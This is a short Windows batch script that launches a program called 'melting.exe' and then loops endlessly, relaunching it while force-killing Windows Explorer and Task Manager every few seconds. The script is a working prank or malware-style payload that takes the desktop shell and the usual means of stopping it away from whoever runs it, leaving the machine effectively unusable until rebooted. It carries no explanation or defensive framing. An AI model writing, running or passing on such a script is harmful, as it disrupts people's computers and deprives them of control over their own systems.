@echo off
start melting.exe
timeout /t 1
:a
start melting.exe
taskkill /f /im explorer*
taskkill /f /im taskmgr*
timeout /t 3
goto a